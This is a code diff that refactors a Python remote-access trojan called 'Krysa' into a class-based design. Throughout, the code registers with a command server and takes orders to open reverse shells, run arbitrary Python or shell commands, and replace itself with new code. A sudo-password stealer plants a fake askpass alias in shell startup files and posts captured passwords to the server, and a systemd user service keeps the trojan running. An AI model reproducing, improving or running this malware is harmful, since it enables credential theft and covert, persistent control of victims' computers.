@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 
-import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request, platform, datetime, pty, signal # Stdlib
-import asyncio
+import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request, platform, datetime, pty, signal, typing, asyncio, dataclasses # Stdlib
 
 try:
 	from websockets.asyncio.client import connect, ClientConnection
@@ -10,24 +9,8 @@ except:
 	subprocess.check_call([sys.executable, "-m", "pip", "install", "-U", "websockets"])
 	os.execv(sys.executable, [sys.executable] + sys.argv)
 
-script_path = os.path.abspath(__file__)
-state_path = script_path + ".pkl"
-ws: ClientConnection = None
-
-# --- State ---
-state = {
-	"uid": None,
-	"version": 1,
-	"servers": ["127.0.0.1:8000"],
-	"persistence": {
-		"enabled": False,
-	},
-	"sudostealer": {
-		"enabled": False,
-	},
-}
-
-current_host = ""
+SERVERS = ["127.0.0.1:8000"]
+krysa: "Krysa" = None
 
 class Specs:
 	def get_os_info():
@@ -125,14 +108,12 @@ class SudoStealer:
 	rcs = ["~/.bashrc","~/.zshrc"]
 	dialogpath = os.path.abspath(__file__) + ".sudo"
 	append = f"\nalias sudo='SUDO_ASKPASS={dialogpath} sudo -A'"
-	
-	async def enable():	
-		DIALOG = """#!/usr/bin/env sh
+	DIALOG = """#!/usr/bin/env sh
 handler()
-{
+{{
 echo "" 1>&2
 exit 130
-}
+}}
 trap handler SIGINT
 username=$(whoami)
 read -s -p "[sudo] password for $username: " password 1>&2
@@ -141,7 +122,12 @@ echo "" 1>&2
 curl --silent --output /dev/null -d "$username:$password" "{}"
 echo "$password"
 """
-		
+
+	def __init__(self):
+		self.enabled: bool = False
+	
+	async def enable(self):	
+		# Creating alias in bashrcs
 		for i in SudoStealer.rcs:
 			i = os.path.expanduser(i)
 			if os.path.exists(i):
@@ -151,14 +137,16 @@ echo "$password"
 					with open(i, 'a') as f:
 						f.write(SudoStealer.append)
 		
+		# Creating dialog script
 		with open(SudoStealer.dialogpath, 'w') as f:
-			f.write(DIALOG.format(f"http://{current_host}/machine/{state['version']}/{state['uid']}/sudostealer/upload"))
-		st = os.stat(SudoStealer.dialogpath)
-		os.chmod(SudoStealer.dialogpath, st.st_mode | stat.S_IEXEC)
-		state["sudostealer"]["enabled"] = True
-		await msg({"event":"module_enabled", "name":"sudostealer"})
+			f.write(SudoStealer.DIALOG.format(f"http://{krysa.current_host}/machine/{krysa.version}/{krysa.uid}/sudostealer/upload"))
+		os.chmod(SudoStealer.dialogpath, os.stat(SudoStealer.dialogpath).st_mode | stat.S_IEXEC)
 
-	def remove_alias():
+		self.enabled = True
+		await krysa.msg({"event":"module_enabled", "name":"sudostealer"})
+
+	async def disable(self):
+		# Removing alias from bashrcs
 		for i in SudoStealer.rcs:
 			i = os.path.expanduser(i)
 			if os.path.exists(i):
@@ -167,22 +155,17 @@ echo "$password"
 				if content.endswith(SudoStealer.append):
 					with open(i, 'w') as f:
 						f.write(content.removesuffix(SudoStealer.append))
-	async def disable():
-		SudoStealer.remove_alias()
-		try:
-			os.remove(SudoStealer.dialogpath)
-		except OSError:
-			pass
-		state["sudostealer"]["enabled"] = False
-		await msg({"event":"module_disabled", "name":"sudostealer"})
+		
+		# Removing dialog script
+		try: os.remove(SudoStealer.dialogpath)
+		except OSError: pass
+
+		self.enabled = False
+		await krysa.msg({"event":"module_disabled", "name":"sudostealer"})
 
 class Persistence:
 	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
-	service_name = f"{state['uid']}.service"
-	service_path = os.path.join(sysd_dir, service_name)
-	
-	async def enable():
-		SERVICE_CONFIG = '''
+	SERVICE_CONFIG = '''
 [Unit]
 After=network.target
 
@@ -193,20 +176,27 @@ Restart=always
 [Install]
 WantedBy=default.target
 '''
-		os.makedirs(Persistence.sysd_dir, exist_ok=True)
-		with open(Persistence.service_path, "w") as f:
-			f.write(SERVICE_CONFIG.format(sys.executable + " " + script_path))
+	def get_service_name() -> str: return f"{krysa.uid}.service"
+	def get_service_path() -> str: return os.path.join(Persistence.sysd_dir, Persistence.get_service_name())
 
-		subprocess.run(["systemctl", "--user", "--now", "enable", Persistence.service_name])
-		state["persistence"]["enabled"] = True
-		await msg({"event":"module_enabled", "name":"persistence"})
+	def __init__(self):
+		self.enabled: bool = False
+	
+	async def enable(self):
+		os.makedirs(Persistence.sysd_dir, exist_ok=True)
+		with open(Persistence.get_service_path(), "w") as f:
+			f.write(Persistence.SERVICE_CONFIG.format(sys.executable + " " + os.path.abspath(__file__)))
+
+		subprocess.run(["systemctl", "--user", "--now", "enable", Persistence.get_service_name()])
+		self.enabled = True
+		await krysa.msg({"event":"module_enabled", "name":"persistence"})
 		sys.exit()
 
-	async def disable():
-		subprocess.run(["systemctl", "--user", "disable", Persistence.service_name])
-		os.remove(Persistence.service_path)
-		state["persistence"]["enabled"] = False
-		await msg({"event":"module_disabled", "name":"persistence"})
+	async def disable(self):
+		subprocess.run(["systemctl", "--user", "disable", Persistence.get_service_name()])
+		os.remove(Persistence.get_service_path())
+		self.enabled = False
+		await krysa.msg({"event":"module_disabled", "name":"persistence"})
 
 class Shell:
 	async def shell_handler(websocket):
@@ -251,117 +241,128 @@ class Shell:
 			os.close(slave_fd)
 	
 	async def start_shell(tunnel_id):
-		async with connect(f"ws://{current_host}/machine/{state['version']}/tunnel/{tunnel_id}") as websocket:
+		async with connect(f"ws://{krysa.current_host}/machine/{krysa.version}/tunnel/{tunnel_id}") as websocket:
 			await Shell.shell_handler(websocket)
 
-def load_state():
-	global state
-	if os.path.isfile(state_path):
-		with open(state_path, "rb") as f:
-			state = pickle.load(f)
-
-def save_state():
-	with open(state_path, "wb") as f:
-		pickle.dump(state,f)
-
-# --- Utility ---
-async def log(data: dict=None, tags:list[str]=[]):
-	o = {"event":"log", "tags": tags}
-	if data != None:
-		o["data"] = data
-	await ws.send(json.dumps(o))
-
-async def msg(data:dict):
-	await ws.send(json.dumps(data))
-
-async def safe_call(callable) -> bool:
-	try:
-		if asyncio.iscoroutinefunction(callable):
-			await callable()
-		else:
-			callable()
-		return True
-	except Exception as e:
-		traceback.print_exc()
+class Krysa:
+	state_path = os.path.abspath(__file__) + ".pkl"
 	
-	return False
+	def __init__(self, servers: list[str] = SERVERS):
+		self.uid: int = -1
+		self.version: int = 0
+		self.servers = servers
+		self.current_host: typing.Optional[str] = None
+		self.ws: ClientConnection = None
+		self.persistence = Persistence()
+		self.sudostealer = SudoStealer()
+	
 
-async def main():
-	global ws, current_host
-	while True:
-		time.sleep(1)
+	def load() -> typing.Optional[typing.Self]:
+		try:
+			if os.path.isfile(Krysa.state_path):
+				with open(Krysa.state_path, "rb") as f:
+					return pickle.load(f)
+		except:
+			print("Couldn't load state")
+		return Krysa()
+	
+	def __getstate__(self):
+		state = self.__dict__.copy()
+		# Don't pickle ws
+		del state["ws"]
+		return state
 
-		if not state["uid"]:
-			for server in state["servers"]:
-				try:
-					with urllib.request.urlopen(f"http://{server}/machine/{state['version']}/register/") as response:
-						if response.code != 200: continue
-						state["uid"] = json.loads(response.read().decode())
-						save_state()
-					break
-				except Exception:
-					traceback.print_exc()
-		
-		for server in state["servers"]:
+	def save(self):
+		with open(Krysa.state_path, "wb") as f:
+			pickle.dump(self,f)
+
+	def register(self):
+		if self.uid != -1: return
+
+		for server in self.servers:
 			try:
-				async with connect(f"ws://{server}/machine/{state['version']}/ws/{state['uid']}") as websocket:
-					current_host = server
-					ws = websocket
-					print("Joined")
-					
-					# websocket.send()
-					while True:
-						try:
-							text = await websocket.recv()
-							data = json.loads(text)
-							if data["event"] == "order":
-								for c in data["orders"]:
-									try:
-										print(c["type"])
-										match c["type"]:
-											case "tcpshell":
-												s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-												s.connect((c["host"],c["port"]))
-												subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
-											case "python":
-												exec(c["code"], globals(), locals())
-											case "run":
-												subprocess.Popen(c["code"],shell=True)
-											case "update":
-												with open(script_path, "w") as f:
-													f.write(c["code"])
-												os.execv(sys.executable, [sys.executable] + sys.argv)
-											case "get_specs":
-												await msg({
-													"event": "specs",
-													"data": Specs.collect_info(c["detailed"] if "detailed" in c else False),
-													})
-											case "enable_module":
-												if c["name"] == "persistence": await Persistence.enable()
-												elif c["name"] == "sudostealer": await SudoStealer.enable()
-											case "disable_module":
-												if c["name"] == "persistence": await Persistence.disable()
-												elif c["name"] == "sudostealer": await SudoStealer.disable()
-											
-									except Exception:
-										traceback.print_exc()
-										await log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
-									else:
-										await log(tags=["succes","order"])
-							elif data["event"] == "shell":
-								asyncio.create_task(Shell.start_shell(data["tunnel_id"]))
-						except ConnectionClosedError:
-							break
-						except Exception:
-							traceback.print_exc()
-					break
-			except KeyboardInterrupt:
+				with urllib.request.urlopen(f"http://{server}/machine/{self.version}/register/") as response:
+					if response.code != 200: continue
+					self.uid = json.loads(response.read().decode())
+					self.save()
 				break
 			except Exception:
 				traceback.print_exc()
 
-	save_state()
+	async def log(self, data: dict=None, tags:list[str]=[]):
+		o = {"event":"log", "tags": tags}
+		if data != None:
+			o["data"] = data
+		await self.ws.send(json.dumps(o))
+	
+	async def msg(self, data:dict):
+		await self.ws.send(json.dumps(data))
+
+	async def main(self):
+		while True:
+			time.sleep(1)
+			for server in self.servers:
+				try:
+					async with connect(f"ws://{server}/machine/{self.version}/ws/{self.uid}") as ws:
+						self.current_host = server
+						self.ws = ws
+						self.save()
+						print("Joined")
+						
+						while True:
+							try:
+								text = await ws.recv()
+								data = json.loads(text)
+								if data["event"] == "order":
+									for c in data["orders"]:
+										try:
+											print(c["type"])
+											match c["type"]:
+												case "tcpshell":
+													s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+													s.connect((c["host"],c["port"]))
+													subprocess.Popen(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
+												case "python":
+													exec(c["code"], globals(), locals())
+												case "run":
+													subprocess.Popen(c["code"],shell=True)
+												case "update":
+													with open(os.path.abspath(__file__), "w") as f:
+														f.write(c["code"])
+													os.execv(sys.executable, [sys.executable] + sys.argv)
+												case "get_specs":
+													await self.msg({
+														"event": "specs",
+														"data": Specs.collect_info(c["detailed"] if "detailed" in c else False),
+														})
+												case "enable_module":
+													if c["name"] == "persistence": await self.persistence.enable()
+													elif c["name"] == "sudostealer": await self.sudostealer.enable()
+												case "disable_module":
+													if c["name"] == "persistence": await self.persistence.disable()
+													elif c["name"] == "sudostealer": await self.sudostealer.disable()
+												
+										except Exception:
+											traceback.print_exc()
+											await self.log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
+										else:
+											await self.log(tags=["succes","order"])
+								elif data["event"] == "shell":
+									asyncio.create_task(Shell.start_shell(data["tunnel_id"]))
+							except ConnectionClosedError:
+								break
+							except Exception:
+								traceback.print_exc()
+						break
+				except KeyboardInterrupt:
+					break
+				except Exception:
+					traceback.print_exc()					
+
+		self.save()
+
 
 if __name__ == "__main__":
-	load_state()
-	asyncio.run(main())
+	krysa = Krysa.load()
+	krysa.register()
+	asyncio.run(krysa.main())
